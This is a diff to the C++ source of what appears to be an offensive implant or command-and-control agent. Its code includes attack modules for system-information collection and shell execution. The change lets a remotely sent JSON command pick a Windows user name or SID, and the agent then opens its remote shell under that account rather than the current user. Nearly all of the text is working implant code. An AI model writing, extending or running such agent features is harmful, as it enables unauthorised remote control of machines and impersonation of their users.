@@ -8,6 +8,10 @@
 
 #include "Attacks/Collection/sysinfo.hpp"
 #include "Attacks/Execution/Shell.hpp"
+#ifdef _WIN32
+#include "utils/win32/include/WinUtils.hpp"
+#include "utils/win32/include/UserUtils.hpp"
+#endif
 
 
 using namespace CppAgent;
@@ -44,11 +48,25 @@ std::string CommandHandler::handle(std::string_view reqJson)
     }
 }
 
-std::string CommandHandler::onStartShell(const Document&)
+std::string CommandHandler::onStartShell(const Document& req)
 {
-	if (!shell_) shell_ = std::make_unique<execution::Shell>();
+    if (!shell_) shell_ = std::make_unique<execution::Shell>();
 #ifdef _WIN32
-    shellRunning_ = shell_->create_by_sid(L"CURRENT_USER");
+    std::wstring sid = L"CURRENT_USER";
+    const Value* cmd_obj = nullptr;
+    if (json::getObject(req, "command", cmd_obj)) {
+        std::string user_name;
+        if (json::getString(*cmd_obj, "user_name", user_name) && !user_name.empty()) {
+            std::wstring wname = win32::charToWchar(user_name.c_str());
+            std::wstring tmp = win32::user::get_sid_by_user_name(wname);
+            if (!tmp.empty()) sid = std::move(tmp);
+        }
+        std::string sid_str;
+        if (json::getString(*cmd_obj, "sid", sid_str) && !sid_str.empty()) {
+            sid = win32::charToWchar(sid_str.c_str());
+        }
+    }
+    shellRunning_ = shell_->create_by_sid(sid);
 #else
     shellRunning_ = shell_->create();
 #endif
